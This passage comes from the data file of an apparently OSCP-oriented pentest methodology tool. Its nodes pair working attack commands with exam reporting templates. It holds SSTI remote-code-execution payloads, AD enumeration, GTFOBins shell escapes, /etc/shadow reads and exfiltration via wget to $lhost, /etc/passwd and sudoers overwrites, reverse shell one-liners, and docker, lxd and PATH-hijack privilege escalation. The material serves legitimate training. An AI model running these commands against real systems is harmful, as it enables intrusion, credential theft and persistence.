    body: "Input reflected in a template engine. Test math expressions — if 7*7 returns 49, you have SSTI. Engine fingerprint determines the payload.",
    cmd: `# Probe — inject into every input field
{{7*7}}       # if returns 49 = Jinja2/Twig
#{7*7}        # if returns 49 = Ruby ERB
<%= 7*7 %>    # ERB / EJS

# Jinja2 (Python/Flask) — RCE
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# Jinja2 sandbox escape
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}

# Twig (PHP) — RCE
{{['id']|filter('system')}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# FreeMarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`,
    warn: null,
    choices: [
      { label: "Got RCE via SSTI", next: "reverse_shell" },
      { label: "Reflected but no RCE — different engine", next: "web_fuzz_deep" },
    ],
  },

  ad_manual: {
    phase: "AD",
    title: "AD Manual Enum — BloodHound Dead End",
    body: "BloodHound found nothing useful. Go manual. net commands, LDAP queries, share permissions, local admin hunting.",
    cmd: `net user /domain
net group /domain
net group "Domain Admins" /domain
net localgroup administrators

Get-DomainUser | select samaccountname,description
Get-DomainComputer | select name,operatingsystem
Get-DomainGroupMember "Domain Admins"
Find-LocalAdminAccess

ldapsearch -x -h $ip -D "user@domain.com" -w 'pass' \\
  -b "dc=domain,dc=com" "(objectClass=user)" description

Get-DomainUser | select samaccountname,description \\
  | Where description -ne $null

Find-DomainShare -CheckShareAccess`,
    warn: null,
    choices: [
      { label: "Found password in description field", next: "creds_found" },
      { label: "Found local admin on another machine", next: "lateral_movement" },
      { label: "Found interesting share", next: "smb_loot" },
      { label: "Check AD CS for vulnerable templates", next: "adcs" },
      { label: "Nothing — try GenericWrite/shadow creds", next: "acl_abuse" },
    ],
  },

  gtfobins_linux: {
    phase: "LINUX",
    title: "GTFOBins — Linux Living Off The Land",
    body: "Unix binaries that can be abused for privesc, file read/write, shells, and transfer. Reference: gtfobins.github.io — always filter by your context (SUID, sudo, capabilities).",
    cmd: `# ── REFERENCE ────────────────────────────────────────
# https://gtfobins.github.io
# Filter by: Shell | Sudo | SUID | File Read | File Write | Capabilities

# ── SHELL — ESCAPE RESTRICTED SHELLS ─────────────────
python3 -c 'import os; os.system("/bin/bash")'
perl -e 'exec "/bin/bash";'
ruby -e 'exec "/bin/bash"'
lua -e 'os.execute("/bin/bash")'
awk 'BEGIN {system("/bin/bash")}'
find / -name . -exec /bin/bash \; -quit
expect -c 'spawn /bin/bash; interact'
node -e 'require("child_process").spawn("/bin/bash",{stdio:"inherit"})'

# ── FILE READ — READ ANY FILE ─────────────────────────
# When binary has sudo/SUID/cap_dac_read_search
cat /etc/shadow   # if readable
# less
sudo less /etc/shadow
# !/bin/sh to get shell while in pager

# more
sudo more /etc/shadow

# tail
sudo tail -f /etc/shadow

# head
sudo head /etc/shadow

# sort
sudo sort /etc/shadow

# base64 (encode then decode on Kali)
base64 /etc/shadow | base64 -d

# tee (read + write)
sudo tee /etc/shadow

# cp (SUID — copy to readable location)
cp /etc/shadow /tmp/s && cat /tmp/s

# wget (exfil as POST)
sudo wget --post-file=/etc/shadow http://$lhost:4444
# Kali listener: nc -nlvp 4444

# curl
curl file:///etc/shadow

# dd
sudo dd if=/etc/shadow

# xxd
sudo xxd /etc/shadow | xxd -r

# ── FILE WRITE — WRITE ANY FILE ──────────────────────
# tee
echo "r00t::0:0::/root:/bin/bash" | sudo tee -a /etc/passwd

# dd
echo "r00t::0:0::/root:/bin/bash" | sudo dd of=/etc/passwd oflag=append conv=notrunc

# cp (SUID)
echo "joe ALL=(ALL) NOPASSWD:ALL" > /tmp/s && cp /tmp/s /etc/sudoers

# ── SUDO ESCAPES (common binaries) ───────────────────
# vim
sudo vim -c ':!/bin/bash'
# nano — Ctrl+R Ctrl+X → reset; bash 1>&0 2>&0
# less — !/bin/bash
# man — !/bin/bash
# git
sudo git -p help    # then !/bin/bash in pager
sudo git branch --help   # then !/bin/bash
# git log
sudo git log --help --P   # then !/bin/bash
# ftp
sudo ftp
# ftp> !/bin/bash
# zip
sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="sh -c /bin/bash"
# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
# mysql
sudo mysql -e '\! /bin/bash'
# wget
sudo wget -O /etc/sudoers http://$lhost/sudoers
# rsync
sudo rsync -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null
# strace
sudo strace -o /dev/null /bin/bash
# nmap (old)
sudo nmap --interactive
# env
sudo env /bin/bash
# LD_PRELOAD (if env_keep)
# cat > /tmp/pe.c << EOF
# #include<stdlib.h>
# void _init(){setuid(0);system("/bin/bash");}
# EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <allowed_cmd>

# ── REVERSE SHELL ONE-LINERS ─────────────────────────
# bash
bash -i >& /dev/tcp/$lhost/$lport 0>&1
# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$lhost",$lport));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
# perl
perl -e 'use Socket;$i="$lhost";$p=$lport;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");'
# nc with -e
nc -e /bin/bash $lhost $lport
# nc without -e
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $lhost $lport > /tmp/f
# php
php -r '$sock=fsockopen("$lhost",$lport);exec("/bin/bash -i <&3 >&3 2>&3");'

# ── BIND SHELL ───────────────────────────────────────
nc -nlvp 4444 -e /bin/bash   # target listens
nc $ip 4444                   # connect from Kali`,
    warn: "Always check gtfobins.github.io with the correct filter for your context — a binary exploitable via sudo may not be exploitable via SUID and vice versa.",
    choices: [
      { label: "sudo context", next: "sudo_check" },
      { label: "SUID context", next: "suid_check" },
      { label: "Got shell — stabilize it", next: "shell_upgrade" },
      { label: "Back to Linux privesc", next: "linux_post_exploit" },
    ],
  },

  linux_privesc_extra: {
    phase: "LINUX",
    title: "Linux — Interesting Groups & PATH Hijack",
    body: "Group membership can be instant root. Check id carefully — docker, lxd, disk, adm, staff all have known privesc paths.",
    cmd: `# ── CHECK GROUP MEMBERSHIP ───────────────────────────
id
groups
cat /etc/group | grep $(whoami)

# ── DOCKER GROUP ─────────────────────────────────────
# docker group = root without sudo
docker images
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# Now you have root filesystem access
# Read shadow: cat /mnt/etc/shadow
# Add user: echo "r00t::0:0::/root:/bin/bash" >> /mnt/etc/passwd

# If no images available:
docker pull alpine
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# ── LXD / LXC GROUP ──────────────────────────────────
# Build alpine image on Kali:
# git clone https://github.com/saghul/lxd-alpine-builder
# ./build-alpine → produces alpine.tar.gz
# Transfer to target then:
lxc image import ./alpine.tar.gz --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
# Inside container: cd /mnt/root && cat etc/shadow

# ── DISK GROUP ───────────────────────────────────────
# disk group = read raw disk = read any file, bypasses all permissions
# Lab validated: Fanatastic (PG Practice)

# Step 1: find which device / is on
df -h
# Look for: /dev/sdaX → /

# Step 2: open with debugfs
debugfs /dev/sda2   # adjust to match your device

# Step 3: read anything
# debugfs interactive commands:
# ls /root
# cat /root/.ssh/id_rsa      ← grab root SSH key (instant root)
# cat /etc/shadow             ← grab hashes
# cat /root/proof.txt         ← grab flag directly
# cat /home/user/.bash_history

# Step 4: use the key
# Copy key output to Kali → vim id_rsa → paste → :wq
chmod 600 id_rsa
ssh -i id_rsa root@$ip

# Non-interactive read (if you need to script it):
echo "cat /root/.ssh/id_rsa" | debugfs /dev/sda2 2>/dev/null
echo "cat /etc/shadow" | debugfs /dev/sda2 2>/dev/null

# Write files (more dangerous — use carefully):
# debugfs -w /dev/sda2
# then: write /tmp/myfile /etc/cron.d/backdoor

# ── ADM GROUP ────────────────────────────────────────
# adm group = read /var/log — hunt for creds
grep -ri "password\|pass\|auth" /var/log/ 2>/dev/null | grep -v "^Binary"
cat /var/log/auth.log | grep -i "pass\|accept\|fail"
cat /var/log/apache2/access.log 2>/dev/null
cat /var/log/apache2/error.log 2>/dev/null
cat /var/log/mysql/error.log 2>/dev/null

# ── STAFF GROUP ──────────────────────────────────────
# staff can write to /usr/local — which is first in PATH
# Plant malicious binary ahead of system binary
ls -la /usr/local/bin/
echo '#!/bin/bash
bash -i >& /dev/tcp/$lhost/4444 0>&1' > /usr/local/bin/service
chmod +x /usr/local/bin/service
# Wait for root to run "service"

# ── PATH HIJACK ───────────────────────────────────────
echo $PATH
# If you can write to any dir early in PATH:
find / -writable -type d 2>/dev/null | grep -E "bin|sbin|local"

# Check if crontab or script calls binary without full path:
cat /etc/crontab | grep -v "^#"
# If: * * * * * root cleanup  (no full path)
# Create malicious cleanup in writable PATH dir:
echo '#!/bin/bash
chmod +s /bin/bash' > /tmp/cleanup
chmod +x /tmp/cleanup
export PATH=/tmp:$PATH
# Wait for cron to fire then: /bin/bash -p

# ── VIDEO GROUP ───────────────────────────────────────
# video group = read framebuffer = screenshot screen
cat /dev/fb0 > /tmp/screen.raw   # capture screen

# ── BACKUP GROUP ─────────────────────────────────────
# backup group = read any file via tar
tar -czf /tmp/shadow.tar.gz /etc/shadow
tar -xzf /tmp/shadow.tar.gz -C /tmp
cat /tmp/etc/shadow`,
    warn: "docker and lxd group membership is instant root — check id immediately on every new shell. PATH hijack only works if the cron/script calls binaries without full path.",
    choices: [
      { label: "Got root shell", next: "got_root_linux" },
      { label: "Got shadow hashes", next: "hashcrack" },
      { label: "Back to enum", next: "linux_post_exploit" },
    ],
  },


  // ==========================================
  //  DOCUMENTATION — MITRE ATT&CK SUBGRAPH
  // ==========================================

  reporting: {
    phase: "REPORT",
    title: "Documentation — The Path",
    body: "Structure your notes around MITRE ATT&CK tactics. Walk each tactic in order — it forces completeness and produces a report that speaks the language of every SOC, client, and hiring manager. Document AS YOU GO. OffSec has failed candidates with all flags for insufficient evidence.",
    cmd: `# Set up your machine folder NOW — before you hack
mkdir -p ~/results/$ip/{scans,exploits,loot,screenshots,tunnels}

# ATT&CK Tactic flow for each machine:
# TA0043 → Reconnaissance
# TA0001 → Initial Access
# TA0002 → Execution
# TA0004 → Privilege Escalation
# TA0006 → Credential Access      (if applicable)
# TA0008 → Lateral Movement       (if applicable)
# TA0007 → Discovery              (post-shell enum)
# TA0040 → Impact                 (flags)

# Minimum screenshots per machine: 4
# foothold + local.txt + privesc vector + proof.txt`,
    warn: "Do not wait until the end to write notes. You will forget the middle — the middle is what OffSec grades.",
    choices: [
      { label: "TA0043 — Reconnaissance", next: "doc_recon" },
      { label: "TA0001 — Initial Access", next: "doc_initial_access" },
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "TA0006 — Credential Access", next: "doc_cred_access" },
      { label: "TA0008 — Lateral Movement", next: "doc_lateral" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Final submission checklist", next: "doc_submit" },
      { label: "Report writing structure", next: "report_writing" },
      { label: "Note-taking setup (Obsidian)", next: "note_setup" },
      { label: "Back to hacking", next: "start" },
    ],
  },

  note_setup: {
    phase: "REPORT",
    title: "Note-Taking Setup — Obsidian",
    body: "Obsidian is markdown-native, vault-based, and works offline. Every note is a plain .md file you own. YAML frontmatter makes notes searchable and filterable. The Path's Obsidian export button generates a structured note for each node — paste it directly into your vault as your live working doc.",
    cmd: `# -- Vault structure (best practice) -------------------
OSCP-Vault/
├-- 00-Templates/
│   ├-- machine-template.md
│   └-- engagement-template.md
├-- 01-Machines/
│   └-- 192.168.x.x - MachineName/
│       ├-- 00-overview.md
│       ├-- 01-enumeration.md
│       ├-- 02-foothold.md
│       ├-- 03-privesc.md
│       └-- 04-loot.md
├-- 02-Methodology/
│   └-- (The Path exports go here)
├-- 03-Cheatsheets/
└-- 04-Exam/

# -- Machine overview template (frontmatter) ------------
---
title: "MachineName"
ip: "192.168.x.x"
os: ""
difficulty: ""
status: in-progress
tags: [oscp, lab, linux]
date: 2026-01-01
---

# MachineName — 192.168.x.x

## Ports
| Port | Service | Version | Notes |
|------|---------|---------|-------|
|      |         |         |       |

## Attack Path
- [ ] Initial foothold via:
- [ ] Privesc via:

## Flags
| Flag | Path | Hash |
|------|------|------|
| local.txt | | |
| proof.txt | | |

## Credentials
| Service | User | Password / Hash |
|---------|------|-----------------|

# -- Enumeration note -----------------------------------
---
title: "Enumeration"
phase: recon
tags: [nmap, enum]
---

## Nmap Full TCP
\`\`\`
[paste allports.txt here]
\`\`\`

## Nmap Targeted
\`\`\`
[paste targeted.txt here]
\`\`\`

## Web / Service Notes
- 

## Attack Surface
- 

# -- Foothold note --------------------------------------
---
title: "Initial Foothold"
phase: exploitation
cve: ""
tags: [foothold, rce]
---

## Vulnerability
- CVE / Exploit ID:
- Service:
- Description:

## Exploitation Steps
\`\`\`bash
# 1. setup
# 2. run
# 3. catch shell
\`\`\`

## Shell Info
\`\`\`bash
whoami && id && hostname
cat /home/*/local.txt 2>/dev/null
\`\`\`

## Creds / Keys Found
| Service | User | Secret |
|---------|------|--------|

# -- Privesc note ---------------------------------------
---
title: "Privilege Escalation"
phase: privesc
vector: ""
tags: [privesc, linux]
---

## Enumeration
\`\`\`bash
sudo -l
find / -perm -4000 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
\`\`\`

## LinPEAS Key Findings
- 

## Vector Used
\`\`\`bash
# steps to root
\`\`\`

## Proof
\`\`\`bash
whoami && cat /root/proof.txt
\`\`\`

# -- Loot note ------------------------------------------
---
title: "Loot"
phase: post-exploitation
tags: [loot, creds, flags]
---

## Flags
| local.txt | /home/user/ | [hash] |
| proof.txt | /root/      | [hash] |

## Credentials
| Service | User | Password / Hash |
|---------|------|-----------------|

## Network (pivot check)
\`\`\`
ip a
ip route
\`\`\`

## Interesting Files
- 

# -- Useful Obsidian shortcuts --------------------------
# Ctrl+N          new note
# Ctrl+P          command palette
# Ctrl+O          open note
# Ctrl+Shift+F    search vault
# Ctrl+E          toggle edit/preview
# [[note name]]   link to another note
# #tag            tag a note
# - [ ]           checkbox task`,
    warn: "Use frontmatter on every machine note — status, ip, tags. It makes vault search instant and lets you filter in-progress vs complete on exam day. Back up your vault to git: git add . && git commit -m 'session notes' && git push",
    choices: [
      { label: "Back to tactic index", next: "reporting" },
      { label: "Final submission checklist", next: "doc_submit" },
    ],
  },

  doc_recon: {
    phase: "REPORT",
    title: "TA0043 — Reconnaissance",
    body: "Document every service you identified and how. This section justifies your attack path — reviewers need to see that you found the vulnerability through methodical enumeration, not luck.",
    cmd: `# TA0043 Reconnaissance — note template
# Technique IDs to reference:
#   T1595 — Active Scanning (nmap, masscan)
#   T1592 — Gather Host Information (service versions)
#   T1590 — Gather Network Information (DNS, subnet mapping)
#   T1046 — Network Service Discovery

## Recon Summary for $ip
Host: $ip
OS Guess: [Linux/Windows + version]
Open Ports: [list]

## Services Identified
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 80   | HTTP    | Apache 2.4.49 | CVE-2021-41773 candidate |
| 445  | SMB     | Samba 4.x     | Anonymous auth? Y/N |

## Key Findings
- [What stood out — outdated version, misconfig, anonymous access]
- [Why you chose the attack path you did]

## Evidence
- Screenshot: nmap full scan output
- Screenshot: service version banner
- File: ~/results/$ip/full.txt`,
    warn: "Version numbers matter — 'Apache on port 80' fails. 'Apache 2.4.49 on port 80, CVE-2021-41773 confirmed' passes.",
    choices: [
      { label: "TA0001 — Initial Access", next: "doc_initial_access" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_initial_access: {
    phase: "REPORT",
    title: "TA0001 — Initial Access",
    body: "The foothold section. Be exact — command, payload, response. This is the section most candidates under-document because they're excited to move on. Slow down.",
    cmd: `# TA0001 Initial Access — note template
# Technique IDs to reference:
#   T1190 — Exploit Public-Facing Application
#   T1078 — Valid Accounts (found creds)
#   T1566 — Phishing (client-side attacks)
#   T1203 — Exploitation for Client Execution

## Initial Access — $ip

Vulnerability: [CVE / vuln name / misconfiguration]
Service: [port + service]
Technique: T1190 / T1078 / T1566 (pick one)

## Exploitation Steps
1. [Exact command or tool used]
2. [Payload delivered / creds used]
3. [Response confirming execution]

## Shell Obtained
Type: [reverse/bind/web shell]
User: [whoami output]
Command used:
  [paste exact command that got the shell]

## Evidence
- Screenshot: exploit execution + response
- Screenshot: whoami + hostname + ip immediately after shell
- File: ~/results/$ip/exploits/payload.txt (save your payload)`,
    warn: "Save your exact payload to disk before moving on. You will need to reproduce this in the report and you will not remember the exact syntax 8 hours later.",
    choices: [
      { label: "TA0002 — Execution", next: "doc_execution" },
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_execution: {
    phase: "REPORT",
    title: "TA0002 — Execution",
    body: "Document how you ran code on the target. Often overlaps with Initial Access but worth its own note — especially for multi-stage payloads, web shells, or script interpreters.",
    cmd: `# TA0002 Execution — note template
# Technique IDs to reference:
#   T1059.001 — PowerShell
#   T1059.003 — Windows Command Shell (cmd.exe)
#   T1059.004 — Unix Shell
#   T1059.007 — JavaScript (XSS/Node)
#   T1203 — Exploitation for Client Execution
#   T1106 — Native API

## Execution — $ip

Interpreter/Method: [PowerShell / bash / cmd / web shell / etc.]
Technique: T1059.00x

## Commands Run on Target
# Document exactly what you ran — copy from terminal history
history | tail -50

## Payload Details
Type: [Meterpreter / netcat / python / aspx shell / etc.]
Staged/Stageless: [staged uses stager + stage, stageless is single binary]
Delivery method: [uploaded via / triggered via / embedded in]

## Evidence
- Screenshot: payload execution
- Screenshot: callback received on attacker machine
- File: ~/results/$ip/exploits/ (save payload file)`,
    warn: "If you used msfvenom, save the exact generation command. 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=x LPORT=443 -f exe > shell.exe' belongs in your notes verbatim.",
    choices: [
      { label: "TA0004 — Privilege Escalation", next: "doc_privesc" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_privesc: {
    phase: "REPORT",
    title: "TA0004 — Privilege Escalation",
    body: "The most important section for OSCP. Document the exact vector — not just 'I ran linpeas.' What specific finding led to root? Show before and after privilege states.",
    cmd: `# TA0004 Privilege Escalation — note template
# Technique IDs to reference:
#   T1548.001 — Setuid/Setgid (Linux SUID)
#   T1548.003 — Sudo and Sudo Caching
#   T1053.003 — Cron Job (scheduled task)
#   T1053.005 — Scheduled Task (Windows)
#   T1543.003 — Windows Service
#   T1134 — Access Token Manipulation
#   T1068 — Exploitation for Privilege Escalation (kernel/CVE)

## Privilege Escalation — $ip

Vector: [SUID / sudo / cron / service / token / CVE / etc.]
Technique: T1548.001 / T1053.003 / etc. (pick closest)

## Low-Privilege State (BEFORE)
whoami && id && hostname
# [paste output]

## Escalation Steps
1. [How you found the vector — linpeas finding, manual check]
2. [Exact command to exploit]
3. [Any intermediate steps]

## Root/SYSTEM State (AFTER)
whoami && id
# [paste output — must show root or SYSTEM]

## Evidence
- Screenshot: low-priv whoami BEFORE escalation
- Screenshot: the specific finding (sudo -l / find SUID / crontab)
- Screenshot: exploitation command
- Screenshot: root/SYSTEM whoami AFTER
- Screenshot: proof.txt with whoami + hostname + ip in same frame`,
    warn: "TWO whoami screenshots required — before AND after. One screenshot of root alone is not sufficient evidence of the escalation path.",
    choices: [
      { label: "TA0006 — Credential Access", next: "doc_cred_access" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_cred_access: {
    phase: "REPORT",
    title: "TA0006 — Credential Access",
    body: "Document every credential found — hashes, plaintext, tokens, keys. These often chain into lateral movement. Even creds you didn't use are worth noting for the report.",
    cmd: `# TA0006 Credential Access — note template
# Technique IDs to reference:
#   T1003.001 — LSASS Memory (mimikatz, pypykatz)
#   T1003.002 — SAM (reg save + impacket)
#   T1003.003 — NTDS.dit (domain controller)
#   T1003.006 — DCSync
#   T1552.001 — Credentials in Files
#   T1552.004 — Private Keys (SSH keys, PEM)
#   T1558.003 — Kerberoasting
#   T1558.004 — AS-REP Roasting

## Credential Access — $ip

Method: [mimikatz / secretsdump / file search / kerberoast / etc.]
Technique: T1003.001 / T1552.001 / T1558.003 (pick closest)

## Credentials Found
| Type     | Username | Value                    | Cracked? |
|----------|----------|--------------------------|----------|
| NTLM     | admin    | aad3b435b51404ee...      | Y: Pass1 |
| SSH Key  | root     | /home/user/.ssh/id_rsa   | N/A      |
| Plaintext| svc_sql  | Winter2023!              | N/A      |

## Cracking Commands Used
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
john --format=NT hashes.txt --wordlist=rockyou.txt

## Evidence
- Screenshot: dump command + output
- Screenshot: cracked hash result
- File: ~/results/$ip/loot/hashes.txt`,
    warn: "Never paste real credentials into a report without client approval — mask with [REDACTED] in deliverables. For the OSCP exam, show the full value.",
    choices: [
      { label: "TA0008 — Lateral Movement", next: "doc_lateral" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_lateral: {
    phase: "REPORT",
    title: "TA0008 — Lateral Movement",
    body: "The section most candidates skip because it feels like 'just pivoting.' Document the full chain — how you moved from one host to another, what credential or technique enabled it, and what you found on the other side.",
    cmd: `# TA0008 Lateral Movement — note template
# Technique IDs to reference:
#   T1021.001 — Remote Desktop Protocol
#   T1021.002 — SMB/Windows Admin Shares
#   T1021.004 — SSH
#   T1021.006 — WinRM
#   T1550.002 — Pass the Hash
#   T1550.003 — Pass the Ticket
#   T1563 — Remote Service Session Hijacking

## Lateral Movement — $ip → $target

From: $ip ([username] @ [hostname])
To: $target ([username] @ [hostname])
Method: [PtH / SSH / WinRM / RDP / SMB exec]
Technique: T1021.002 / T1550.002 (pick closest)

## Movement Steps
1. [Credential/ticket used to move]
2. [Exact command]
3. [Confirmation of access]

## Tunnel Setup (if applicable)
# Document your pivot setup — Ligolo / Chisel / SSH
# Include listener config, agent config, route added

## Evidence
- Screenshot: command on source machine
- Screenshot: shell/access confirmed on target machine
- Screenshot: tunnel established (if pivoting)
- Network diagram: hand-drawn or ASCII showing the chain`,
    warn: "Draw the network. Even ASCII art. 'Attacker → Machine 1 (pivot) → Machine 2 → DC' on one line is enough. Reviewers need to see you understood the topology.",
    choices: [
      { label: "TA0007 — Discovery (post-shell)", next: "doc_discovery" },
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_discovery: {
    phase: "REPORT",
    title: "TA0007 — Discovery",
    body: "Post-shell enumeration. What did you find once inside? This section ties recon to lateral movement and shows situational awareness — you didn't just exploit and move on, you understood the environment.",
    cmd: `# TA0007 Discovery — note template
# Technique IDs to reference:
#   T1082 — System Information Discovery
#   T1049 — System Network Connections Discovery
#   T1033 — System Owner/User Discovery
#   T1087 — Account Discovery
#   T1069 — Permission Groups Discovery
#   T1016 — System Network Configuration Discovery
#   T1018 — Remote System Discovery
#   T1135 — Network Share Discovery

## Post-Shell Discovery — $ip

Shell as: [username + privilege level]

## System Info
hostname && whoami && id
uname -a          # Linux
systeminfo        # Windows

## Network Awareness
ip a / ipconfig   # Interfaces — any dual-homed?
ip route          # Subnets reachable
arp -a            # Other hosts seen recently
ss -tnp / netstat -ano  # Active connections

## Interesting Users / Groups
cat /etc/passwd | grep -v nologin  # Linux
net user && net localgroup administrators  # Windows

## Key Findings
- [Any new subnets discovered]
- [Other live hosts found]
- [Interesting shares, files, configs]

## Evidence
- Screenshot: ifconfig/ipconfig showing all interfaces
- Screenshot: arp table or other host discovery
- Note: any new IPs to add to scope`,
    warn: "Check for dual-homed machines every time — a second interface means a new subnet and potentially the pivot you need to reach the AD set.",
    choices: [
      { label: "TA0040 — Impact (flags)", next: "doc_impact" },
      { label: "Back to tactic index", next: "reporting" },
    ],
  },

  doc_impact: {
    phase: "REPORT",
    title: "TA0040 — Impact (Flags)",
    body: "The proof section. This is what OffSec grades. Every flag needs the holy trinity in a single screenshot: whoami/id + hostname + ip + flag content. No exceptions.",
    cmd: `# TA0040 Impact — flag capture template
# Technique IDs:
#   T1565 — Data Manipulation (you achieved impact)
#   T1486 — Data Encrypted / T1496 — Resource Hijacking (conceptual)

## Flag Capture — $ip

### local.txt (low privilege)
# Linux
whoami && hostname && ip a && cat /home/*/local.txt 2>/dev/null || find / -name local.txt 2>/dev/null -exec cat {} \;

# Windows
whoami && hostname && ipconfig && type C:\Users\*\Desktop\local.txt

### proof.txt (root / SYSTEM)
# Linux
id && hostname && ip a && cat /root/proof.txt

# Windows — MUST use interactive shell (not web shell)
whoami && hostname && ipconfig && type C:\Users\Administrator\Desktop\proof.txt

## Flag Log
| Machine IP | User Flag (local.txt) | Root Flag (proof.txt) | Time |
|------------|----------------------|----------------------|------|
| $ip        | [hash value]         | [hash value]         | 00:00|

## Evidence Requirements
- ✅ local.txt: whoami + hostname + ip + flag — SINGLE screenshot
- ✅ proof.txt: whoami (root/SYSTEM) + hostname + ip + flag — SINGLE screenshot
- ✅ proof.txt on Windows captured via interactive shell only`,
    warn: "Windows proof.txt MUST be captured from an interactive shell — RDP, WinRM, or evil-winrm. A web shell screenshot alone will not be accepted by OffSec.",
    choices: [
      { label: "Final submission checklist", next: "doc_submit" },
      { label: "Back to tactic index", next: "reporting" },
      { label: "Next machine", next: "start" },
    ],
  },

  doc_submit: {
    phase: "REPORT",
    title: "Submission Checklist",
    body: "Stop hacking 90 minutes before the exam ends. You need this time. Rushing the submission has failed people who had all the flags. Work through this list methodically.",
    cmd: `# SUBMISSION CHECKLIST — Do not skip steps

## 1. Flag Verification
# Confirm all flags are logged with correct screenshots
grep -r "local\|proof" ~/results/*/screenshots/

## 2. Screenshot Audit — per machine
# For each machine confirm you have:
# [ ] Recon: nmap output with versions
# [ ] Foothold: exploit execution + shell callback
# [ ] local.txt: whoami + hostname + ip + flag (single frame)
# [ ] Privesc: vector identified + exploitation command
# [ ] proof.txt: root/SYSTEM + hostname + ip + flag (single frame)

## 3. Notes Completeness
# Walk every ATT&CK tactic node for each machine
# TA0043 Recon ✓ / TA0001 Access ✓ / TA0002 Exec ✓
# TA0004 Privesc ✓ / TA0006 Creds ✓ / TA0008 Lateral ✓ / TA0040 Impact ✓

## 4. Disconnect VPN
sudo killall openvpn
# Exam proctoring ends here — confirm with proctor

## 5. Build Report Archive
cd ~/results
zip -r oscp_report_$(date +%Y%m%d).zip */
md5sum oscp_report_$(date +%Y%m%d).zip

## 6. Upload
# OffSec submission portal — upload zip
# Note the confirmation number / email
# Do not close the browser until confirmed

## 7. Breathe
echo "Done."`,
    warn: "The MD5 hash proves your submission was not tampered with. Note it down before uploading. If the portal has issues, email support@offensive-security.com immediately with your hash.",
    choices: [
      { label: "Back to tactic index", next: "reporting" },
      { label: "Start a new machine", next: "start" },
    ],
  },

  report_writing: {
    phase: "REPORT",
    title: "Report Writing Structure",
    body: "The report is the only deliverable the client sees. Notes are for you — the report is for them. Two audiences: executive (no jargon, business impact) and technical (enough detail to replicate and fix every finding). Structure matters more than prose quality. A clear finding table with PoC and remediation beats elegant writing every time.",
    cmd: `# -- Report structure ----------------------------------
# 1. Executive Summary
# 2. Testing Environment Considerations
# 3. Technical Summary (grouped findings)
# 4. Technical Findings and Recommendations
# 5. Appendices

# -- 1. Executive Summary template ---------------------
## Engagement Overview
- Scope: [URLs / IP ranges tested]
- Timeframe: [dates + hours]
- Methodology: [OSCP / PTES / OWASP]
- Testing type: [black box / grey box / credentialed]
- Source IP: [your attack machine IP]
- Accounts provided: [none / list them]
- Constraints: [no DoS / no social engineering / etc]

## What went well (always include something)
"The application enforced account lockout after 5 failed attempts,
preventing brute force attacks. Strong password policy was observed."

## Key findings narrative (trends, not exhaustive list)
"OffSec identified a pattern of unsanitized user input across
multiple endpoints, resulting in SQL injection and XSS. This
suggests input validation is not enforced at the framework level."

## Wrap-up
"Full technical details and remediation steps are provided below."

# -- 2. Testing Environment Considerations -------------
# Document anything that affected the test:
# - Credentials not provided until day 2
# - Scope expanded mid-engagement
# - Time insufficient for full coverage
# - Any system instability caused by testing
# If nothing unusual: "No limitations affected this engagement."

# -- 3. Technical Summary (grouped by category) --------
# Group findings — don't list by timeline
# Categories: Auth, Patch Management, Input Validation,
# Access Control, Encryption, Misconfigurations, AD
# One paragraph per category with severity and trend.

# -- 4. Technical Findings table -----------------------
# Per finding:
# | Ref | Severity | Title | Description | Recommendation |

## Finding template:
### [REF-01] — [High/Med/Low] — [Vuln Name]

**Affected endpoint:** [URL / service / host]
**Vulnerability:** [What it is and why it's dangerous]
**Evidence:** [Screenshot ref / appendix ref]

**Reproduction steps:**
1. Navigate to [URL]
2. Submit payload: [exact payload]
3. Observe: [what happens]

**Impact:** [What an attacker achieves — RCE / data theft / privesc]

**Recommendation:** [Specific, actionable fix — not "patch everything"]
Example: "Parameterize SQL queries using prepared statements in the
login handler at /src/auth/login.php line 42."

# -- Screenshot rules ----------------------------------
# Good screenshot:
# - One concept only
# - URL visible in browser
# - Legible without zooming
# - Caption: 8-10 words max
# - Client branding visible where possible

# Bad screenshot:
# - Two findings in one frame
# - Terminal too small to read
# - No URL / hostname context
# - Caption that re-explains the image

# -- OSCP minimum evidence per machine -----------------
